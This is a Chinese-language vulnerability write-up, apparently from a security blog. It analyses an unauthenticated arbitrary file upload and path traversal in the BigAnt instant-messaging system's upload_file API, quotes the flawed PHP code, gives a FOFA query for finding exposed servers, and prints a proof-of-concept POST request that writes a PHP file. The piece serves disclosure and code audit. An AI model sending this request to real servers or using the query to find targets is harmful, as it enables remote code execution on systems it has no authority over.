---
title: "大蚂蚁 (BigAnt) 即时通讯系统 DispersedOrgController 任意文件上传漏洞"
source: https://mrxn.net/jswz/bigant-dispersedOrg-upload_file-rce.html
asset_dir: assets/大蚂蚁-(bigant)-即时通讯系统-dispersedorgcontroller-任意文件上传漏洞
---

# 大蚂蚁 (BigAnt) 即时通讯系统 DispersedOrgController 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/2/23 13:04
- 343浏览
- [0评论](#comment)
- 24分钟阅读

深入探索

api

授权

server

---

# 漏洞简介

杭州九麒科技大蚂蚁 (BigAnt) 即时通讯系统是一款企业级IM通信管理系统，提供多种功能支持。该系统的 DispersedOrgController upload\_file 接口存在目录遍历+任意文件写入/[上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，攻击者可以通过上传特制的 PHP 文件，执行恶意代码，实现服务器的远程控制，可能导致敏感信息泄露、数据篡改等危害。

短信和即时消息

# 影响版本

BigAnt 5.5.x 及以上版本用户

[![大蚂蚁 (BigAnt) 即时通讯系统 DispersedOrgController 任意文件上传漏洞](images/img-001-af66cd8e6523.webp)](https://image.mrxn.net/5623d2945cc347a388c16efc24905efc.webp)

经过测试，最新版本 6.0.1.20250407.1 也受影响

漏洞扫描服务

深入探索

云安全解决方案

安全运维咨询

数据库

# fofa语法

> (body="/Public/static/admin/admin\_common.js" && body="/Public/lang/zh-cn.js.js") || title="即时通讯 系统登录" && body="/Public/static/ukey/Syunew3.js"

# 漏洞分析

直接看下 Application/Api/Controller/DispersedOrgController.class.php 的实现逻辑

[![大蚂蚁 (BigAnt) 即时通讯系统 DispersedOrgController 任意文件上传漏洞](images/img-002-f783ce0eeb2d.webp)](https://image.mrxn.net/9c7753b630f84c1e9ab85615243dea1e.webp)

先看下 `_initialize` 方法有没有鉴权，可以未授权访问，但是需要提供`server_id`

深入探索

技术文章订阅

网络安全课程

Web安全书籍

再看 `upload_file()` 方法的实现逻辑

防病毒程序与恶意软件

```
public function upload_file(){
    $filePath = I("path");
    $group_id = I("group_id"); //如果带了group_id 说明是群头像更新
       $file_url = I("file_url"); //跨域间传输文件,因为环境导致需要以下载的形式传输

    if(!$filePath){
       Jump::errror("path 错误");
    }
    if(strpos($filePath,"data")===false){
       Jump::errror("path illegal");
    }
    $absolutePath = SITE_PATH."/".$filePath;
    LogWrite("获取上传文件的绝对路径:".$absolutePath);
    $dirname     = dirname($absolutePath);
    if(!is_dir($dirname)){
       if(!mkdir($dirname, 0777, true) && !is_dir($dirname)){
          Jump::errror(301,sprintf('Directory "%s" was not created', $dirname));
       }
    }
    if(is_file($absolutePath)){
       Jump::success("文件已经存在,无需上传");
    }

       $res = sp_download_img($file_url,$absolutePath);      //编译版本的php因为环境差异导致传入文件数组502,采用下载方式传输头像
       if($res===false){
           Jump::errror("头像上传失败");
       }
    //同步群消息
    if($group_id){
       \Common\Model\GroupModel::DD()->where(['group_id'=>$group_id])->save(['group_photo'=>$filePath]);
    }

    Jump::success("上传文件成功");
}
```

文件还是直接上传后保存，且保存路径由用户可控参数`path`==>`$filePath`==>`$absolutePath = SITE_PATH."/".$filePath` 为文件保存路径、文件名、类型以及后缀等，`file_url`参数为远程文件地址，

计算机服务器

只需要满足`path`参数包含字符串`data` 即可通过如下校验部分

```
if(strpos($filePath,"data")===false){
    Jump::errror("path illegal");
}
```

`$absolutePath`被带入`$res = sp_download_img($file_url,$absolutePath);`方法，跟进看下它的实现逻辑

[![大蚂蚁 (BigAnt) 即时通讯系统 DispersedOrgController 任意文件上传漏洞](images/img-003-bf4125b179cf.webp)](https://image.mrxn.net/c6bd552c96c94780908a7c9f8ecad274.webp)

就是常规的使用curl进行文件下载保存，至此这个目录遍历+任意文件、内容写入/上传[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)就清晰明了。

短信和即时消息

# 漏洞复现

> 需要注意thinkphp的路由特性，不区分大小写，且还支持如下等方式
>
> /api/dispersedOrg/upload\_file.html
>
> /api/dispersedOrg/upload\_file

[![大蚂蚁 (BigAnt) 即时通讯系统 DispersedOrgController 任意文件上传漏洞](images/img-004-e4b0608094c7.webp)](https://image.mrxn.net/25a37ebef700452382b881471350c6d8.webp)

```
POST /?m=api&c=dispersedOrg&a=upload_file HTTP/1.1
Host: bigant.mrxn.net
Content-Type: application/x-www-form-urlencoded

path=data.php&file_url=http://127.0.0.1:8001/data.txt&server_id=1
```

访问上传文件 data.php

漏洞扫描服务

[![大蚂蚁 (BigAnt) 即时通讯系统 DispersedOrgController 任意文件上传漏洞](images/img-005-6460e5c31baa.webp)](https://image.mrxn.net/35e2f7d6e23945dd816f6a734b566cfc.webp)

成功[执行](https://mrxn.net/tag/rce)我们上传的文件，并删除自身

[![大蚂蚁 (BigAnt) 即时通讯系统 DispersedOrgController 任意文件上传漏洞](images/img-006-2bb7b534ceb3.webp)](https://image.mrxn.net/9f2fb4bf02fb4d3f8d9d9c403d19b28a.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#php](https://mrxn.net/tag/php)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAK1UlEQVR4Aeyc4Xrctg5EffL+7+zbMXIUEhKttZPr3R/0V3SEmQHIEFTXTtr+ent7e/9OvP/+WtX+lk+95Tuu+qz4Xj/m1sj1vPPf1Xufntv3K5iB/Offf73KCRwD+W+6b4/EauPWqgNvwKknFL/yyduvo7oI1Q/+oDVQ3Mor3/1QdfIiFA8z2qejdXc41h0DGcn9/LwTOA0E5ulD5Y9u0dvQ/TD3gTnXv6pX76h/RLjuvaqF8o898gzFWxduDPk7hOoDM17VnQZyZdrcz53AXw/EGwM1fbfeefMVwlxvnxVC+eEPdq9rrXioWnWY887Dtb5ax/qv4F8P5CuLbe/9CfyzgdzdEri+XX2LMPtgzrt/zGH2wpzf7bHr5uK4Vp5XfLTvxj8byHc3sOvmEzgNxKl3nMv+ZDDfQuCNIXTaD2a/uvhVn/4R7bVCmPdgLcy89TDzMOf6Vmj/jlf+00CuTJv7uRM4BgI1dfgcH92at+HOD7WefpjzR+uBk9WeJ+E3oQ5Mv6sAlf+2HaD/IH4/wLUfiofP8XebDzgG8pHtvz39BH459a/iauf2gboV5vp7Lg/l77l+mHV96kG5FcLcA+a818GsQ+VZK6E/z4meh/tq7DfEU3wRPA0E6hbAjO4Xije/Qyg/XOPdDYKq6+tA8XBGvVCaa8h3VIfZL6+/5/JQdXCN+kS49gFvp4G87a+nnsAxEKiprW6Bu1SH2Q+VQ6G+O4TyQ6HrQOXWy5uL8leoB+Ze8r2m81B1+mDO5Xvdioeq737z4DEQm2x87gmcBgLXU3SbULr5CqF8MOPK3/ncloT8+/v7x58+wrpf/Alrvoow906vxF0fqLp4x4DioVANKrcvVA7sz5C3F/s6vSFO0X2aQ03RXF1c8eodofp9l3e9EeG6p56+1ld562FeZ9VHf8fP/KeB9OKd/+wJ/IKatlODymHGrvdtQvn1ddQPs09ev7kI5TfvCKUDXTrlwMfvWUGhBqi87wFmXl2E0qGw9zO/86sH9xviqb0IHr+XBfOU3V+mloDS8zwGFK8fKocZx5o8Q+m9LloCZl1ftIT5Zwhzj9SNYa0cXPv1rXBV3/365Hsefr8hOYUXiuMzpO/J6cF8a6ByKNS3qu86VJ1+dVG+ozpUPRSOPj2iGpy9aiN+tw7m/vYRoXQoHNfMMxQP7J9D3l7s6/gMcV99qvKiuigvykNNXR4qV+88lA6F6h2tv8I7b9c/8ou/Qe3BNbRA8VAoL+qHz3X9V7g/Q65O5Ync8RnSp2vu3szh8+lD6Y/6e3/rOuoTodaBP/iZBn988Pnzqo97UjcXofqqQ+Vd77n+4H5DcgovFMvPEPfYp2muLkLdhlXeeSi//aDy7us5zD7rg3rFcImeh/ss9HeEeW2Yc3s+Wqd/xP2G9NN7cn4MBGraMGPfH8w6VN59Tl1+lUPVq0Pl1onq5l9Ba2HuDde5/kfRvcDcT76jfaH88AePgfSinT/nBI7vsvryTvGO7z5zqKn3+p7rlzcXYe4jL1oXhPJ2Da751FwFlL9rUDzMqK+vKy923XzE/YZ4Wi+Cy++yoG6B+3SKMPMw5/o7wuyDx3LXves36lC9oXDU8gzXfLSEa0L5oDDaVcBJn2z2k4TyQ6F8cL8hOYUXiuVAVlOVXyHMU1/55KH85p5Nz+XFK71zPYdayx4iFN/96qL6CqH6dL+52Ovlg8uBRNzx8ydw+i4L5inDdQ7FQ+Fq61A6FOqDyr0tUHnXoXh4HHsP17hDmNewT0conzzMeefhMR3Yfx7y9mJfp39keYv6PuU76oPrW6AuwuyDOdcnup65KH+F3WPeEea1r3qN3Hfre5352Nvn00A0b3zOCZx+DrnbBsy3auV34l2X77jyQa2nv/ugdKBLpxz4+PeyFB7pCVUDWHbgXf1hbA/Axz6gcJT3GzKexgs874G8wBDGLRwD8fWDeo2At8RozrO+PI/R+dQm5EVroiXMxXAJ814nL6oH5VYYTyL9x+j+eK5Cn5p5xzu9+8e9HAPppp0/5wSOHwyd0mob6h31yz96O/RZZx9RvuOdHr8eMVzCXHQP5vGM0fme613xXdfnuqJ8cL8hOYUXitO3vX1qq1y+o7dC3l+rfEd1/aK8KN9RfUQ9I5dn117pnV/59YnpPUbne67X/ubB/YbkFF4ojs+QR/fkVFdoH3XzO+x+b5VovT5RPainY7RE5+0hdt286+aivqyRWOX6xXgT+oP7DckpvFCcBuL0+h4zyavQd6WFs1+eE/ofRevF9EhYLx8Mn8jzVfSaeBPyYriEuWjPaAn5PCfMRf1iPGPoG7nTQDRtfM4JLAfi1JzuCrvPX4b+rr+/v3/8DwDkO/Z68xWO9d0zalfP7rHXdd5afV3vvHqv0yfqG3E5EIs2/uwJHD+HOE3RqZmvUF/ftv6Vrn+lW6/vEey9zFfoGqJrmIvWq4srfcVbJ+obcb8hns6L4DEQb4Ho1NynfEd9Ytetv9N7nbn14oqP7hpiuIR5R3uJ8Y4hb92o5bnr+jof7xjqcubBYyCKG597AsuBZFoJt+f0O6rHmzAX9UdLmHfUL670zqenYe0q77y9VnVd17fi7a/e81W9/uByIBZv/NkTOAaS6ST68k5ZfpWn9ir0q5l3tH/3dd5c1B+UE8ONIS+6B3NRXpS3V+dX+cpvP9H64DEQxY3PPYHjd3sznYRT7RgtIe+2zaMl5DtGS8hbZy7Gk1DPc0JdDJcwDyZPWBtuDPl4EmryorwY7xjyK7+8NfpXuf7gfkM8rRfB4yf1vh+nKWZ6CfOO0RIrPlqirxMu0XnzaAlz+5t/ht3b8/RN2ONOjzex8suL8SbMxb6OeXC/IZ7Si+DxGeJ+MqWEuRgukYkn5POciJbI8xj6OsY7Rtd7rlfeNcyDct0bLaEudp98vImu91y/mJox9Hd9lYffb8h4gi/wfPoMyZSuwr32qZuri/Ki/Ar7mvp6vT75Ea3RI8qP3jyvdHnRenMxPcbQJ6dPvufy+oP7DfFUXgRPA8mUxnCfTlfUY65vhXd+9Y69n7q86wfl9HRUF+90femdMBfDfRb6RNczv6o9DUTzxuecwOm7LLfh9MzFPmX5jtaL6tZ3fpXLi/YR7Tei2qpGXdQnysP8XwK4xp2ur+Oqv/2C+w3JKbxQHN9lOT1xtUd10VvQ/fLiSrdP1+9y666w13ZP1837Xnuduf5VLi/q73il7zekn9KT8+MzxNvxKLrvqylHkxfDjdF51+28NermonxQTgw3hnxHPX1t+Y69vuf673h9I+43pJ/ak/NjIN6OO1zt17qVvuK9Hdabd7/6io++0lZ8ahJddw/RxtCnLsqL1piLnTcf8RiIRRufewKngTj1jqtt6rvTvQXdJ7/qIy9ab36F3XOXr/bQe9tnhd1v3v3y4qifBjKK+/nnT+CfD+Rq6uMvy9s4cnmWF7/b56pXuDHsvVpL3pqv5qs6+d5PPvjPB5KmO75/Av9sIN66r27Fuo7eIrH31a8eXHnk40mYi+ES5r33V/O7PupZM2H/4D8biIts/LsTOA0kE7uK1TJ67/RM/yp6fc+t6bzrqQflVhhPouvhEvJ9LfN4EvrynFjl1qk/gqeBPFK0Pf+/EzgGkkk/Endb+c6tSM9e5146H29C/gqjJ9TyfBV9je5XF3uP7jcXV3Xy4tj3GMhI7ufnncAeyPPO/nLl/wEAAP//l782lwAAAAZJREFUAwDfZoi/LIvJbQAAAABJRU5ErkJggg==)

手机扫码阅读
